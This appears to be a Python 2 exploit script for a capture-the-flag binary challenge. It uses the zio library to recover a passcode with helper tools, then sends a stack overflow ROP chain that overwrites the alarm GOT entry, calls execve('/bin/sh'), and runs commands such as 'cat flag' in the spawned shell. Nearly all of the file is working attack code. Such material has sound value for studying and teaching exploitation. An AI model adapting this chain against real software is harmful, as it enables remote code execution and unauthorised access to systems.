from zio import *

is_local = True
is_local = False

binary_path = "./no"

libc_file_path = ""
#libc_file_path = "./libc.so.6"

ip = "127.0.0.1"
port = 2333

if is_local:
	target = binary_path
else:
	target = (ip, port)

def d2v_x64(data):
	return l64(data[:8].ljust(8, '\x00'))

def d2v_x32(data):
	return l32(data[:4].ljust(4, '\x00'))

def rd_wr_str(io, info, buff):
	io.read_until(info)
	io.write(buff)

def rd_wr_int(io, info, val):
	rd_wr_str(io, info, str(val) + "\n")


def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m, env={"LD_PRELOAD":libc_file_path})
	return io

def write_file(filename, data, mode = "wb"):
	file_w = open(filename, mode)
	file_w.write(data)
	file_w.close()

import commands
def do_command(cmd_line):
	(status, output) = commands.getstatusoutput(cmd_line)
	return output

def read_file(filename, mode = "rb"):
	file_r = open(filename, mode)
	data = file_r.read()
	file_r.close()
	return data

set_args_addr = 0x400d2a
call_func_addr = 0x400d10

def gen_rop(func_got, arg1, arg2 = 0, arg3 = 0, ret_addr = None):
    global set_args_addr, call_func_addr
    #set_args_addr
    payload = ""
    payload += l64(set_args_addr)
    payload += l64(0)            #pop rbx = 0
    payload += l64(1)            #pop rbp
    payload += l64(func_got)     #pop r12
    payload += l64(arg3)         #pop r13
    payload += l64(arg2)         #pop r14
    payload += l64(arg1)         #pop r15
    if ret_addr != None:
        payload += l64(ret_addr)
    else:
        payload += l64(call_func_addr)

    return payload


def do_pwn_next(io):
	global set_args_addr, call_func_addr
	p_rdi_ret = 0x0000000000400d33
	p_rsi_r15_ret = 0x0000000000400d31
	p_rbp_ret = 0x400B55
	ret_addr = 0x0000000000400b31

	mov_edx_rbp_p_rbp_ret = 0x4008E8 #adc     [rbp+48h], edx

	read_plt                   = 0x00000000004007e0
	alarm_got                  = 0x0000000000602038
	atoi_plt				   = 0x400800

	data = read_file("do_pwn_next.conf")
	val_list = []
	for line in data.strip().split("\n"):
		val_list.append(int(line, 16))
		print hex(int(line, 16))

	p_rdi_ret 		= val_list[0]
	p_rsi_r15_ret 	= val_list[1]
	ret_addr 		= val_list[2]
	p_rbp_ret 		= val_list[3]
	mov_edx_rbp_p_rbp_ret 		= val_list[4]
	set_args_addr 	= val_list[5]
	call_func_addr 	= val_list[6]
	alarm_got 		= val_list[7]
	read_plt 		= val_list[8]
	atoi_plt 		= val_list[9]

	rbp_add_val = val_list[10]


	bss_addr = 0x00601000 + 0xa00

	pre_payload = ""
	pre_payload += 'a'*(0-rbp_add_val)
	pre_payload += 'b'*8

	payload = ""
	payload += l64(p_rdi_ret) + l64(0)
	payload += l64(p_rsi_r15_ret) + l64(bss_addr)*2
	payload += l64(read_plt)

	payload += gen_rop(bss_addr, 0, 0, 0x5)
	payload += gen_rop(bss_addr, 0, 0, 0x5)[:-8]
	payload += l64(p_rbp_ret) + l64(alarm_got - 0x48)
	payload += l64(mov_edx_rbp_p_rbp_ret) * 2

	#set rax = 0x3b
	payload += l64(p_rdi_ret) + l64(bss_addr + 0x20 + 0*2)
	payload += l64(atoi_plt)
	#execve("/bin/sh", 0, 0)
	payload += gen_rop(alarm_got, bss_addr + 0x8, 0, 0)
	#payload += gen_rop(alarm_got, bss_addr + 0x8, 0, 0)[:-8]
	payload += "\n"

	#io.gdb_hint()
	#print repr(payload)
	print hex(len(payload))

	payload = pre_payload + payload
	print payload[:-1].find("\n")

	#io.gdb_hint()
	io.write(payload)

	#raw_input(":")

	import time
	time.sleep(0.5)
	payload = ""
	payload += l64(ret_addr)
	payload += "/bin/sh\x00".ljust(0x18, '\x00')
	payload += "59\x00"
	payload += "\n"
	io.write(payload)
	time.sleep(0.5)
	

	io.writeline("id")
	io.writeline("ls -al")
	io.writeline("cat flag 2>&1")
	io.writeline("exit")
	io.interact()

def pwn(io):
	io.read_until("------------------data info------------------\n")
	data = io.read_until("\n").strip()
	data = data.decode("base64")
	print(len(data))
	write_file("tmp_file.bin", data)
	#print repr(data.decode("base64")[:4])

	io.read_until("code:")
	do_command("chmod +x tmp_file.bin")
	do_command("python get_addr.py")
	do_command("python angr_deal.py")

	data = read_file("passcode.conf")
	#do_command("rm tmp_file.bin luckynum.conf")

	data = data.strip()
	io.writeline(data)

	do_pwn_next(io)

	io.interact()

io = get_io(target)
pwn(io)
exit(0)
